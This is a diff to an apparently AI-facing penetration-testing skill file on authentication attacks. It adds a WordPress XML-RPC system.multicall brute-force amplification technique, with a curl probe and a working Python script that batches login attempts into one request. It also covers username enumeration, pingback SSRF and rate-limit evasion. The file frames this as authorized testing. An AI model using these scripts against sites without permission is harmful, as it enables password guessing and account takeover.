@@ -2,9 +2,10 @@
 name: red-broken-auth
 description: >
   Authentication and session testing on authorized targets — username
-  enumeration, rate-limit and brute-force checks, password reset token flaws,
-  JWT attacks (alg confusion, weak secrets, unverified claims), session
-  management issues, and MFA bypass basics.
+  enumeration, rate-limit and brute-force checks, WordPress XML-RPC
+  system.multicall amplification, password reset token flaws, JWT attacks
+  (alg confusion, weak secrets, unverified claims), session management
+  issues, and MFA bypass basics.
 when_to_use: >
   Use when the user wants to attack their own auth system or a lab:
   "test my login", "hack the login form", "JWT attack", "crack my JWT
@@ -41,6 +42,42 @@ If responses differ in ANY way (body, status, timing, headers), that's a finding
 - Fire 20 rapid bad logins at a test account: `for i in $(seq 20); do curl ...; done`
 - Watch for: lockout, CAPTCHA, 429, IP throttle. **None after 20 tries = finding.**
 - Check bypasses: rotating `X-Forwarded-For`, changing user-agent, password-spraying (1 password × N users — dodges per-account lockout).
+
+### 2b. WordPress: XML-RPC amplification — 1 request = hundreds of guesses
+
+Hardening plugins often throttle `wp-login.php` and forget `xmlrpc.php`. Worse,
+`system.multicall` packs N login attempts into ONE HTTP request, so per-request
+rate limiting barely slows the guesser down:
+
+```bash
+# Does xmlrpc.php answer at all?
+curl -s -X POST https://TARGET/xmlrpc.php \
+  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params/></methodCall>'
+```
+
+Then prove the amplification with a SMALL multicall (keep N ≤ 10 — this is loud):
+
+```bash
+python3 - <<'EOF'
+import urllib.request
+N = 5
+calls = "".join("""<value><struct>
+ <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
+ <member><name>params</name><value><array><data>
+   <value><string>nosuchuser</string></value><value><string>nosuchpass</string></value>
+ </data></array></value></member></struct></value>""" for _ in range(N))
+body = (f'<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
+        f'<params><param><value><array><data>{calls}</data></array></value></param></params></methodCall>')
+req = urllib.request.Request("https://TARGET/xmlrpc.php", data=body.encode(),
+                             headers={"Content-Type": "text/xml"})
+resp = urllib.request.urlopen(req, timeout=15).read().decode()
+print("auth attempts inside ONE response:", resp.count("Incorrect username or password"))
+EOF
+```
+
+- The fault count in one response **is** the amplification factor (5 proved on a live site; real-world runs 200–500 per request).
+- Bonus in the method list: `pingback` enabled = SSRF relay (→ `red-ssrf`), `wp.getUsers` = name leak.
+- Complement with `GET /wp-json/wp/v2/users` — a JSON list of usernames is a ready-made spray target list (often blocked by hardening plugins; when it answers, instant finding).
 
 ### 3. Password reset — the crown jewels
 
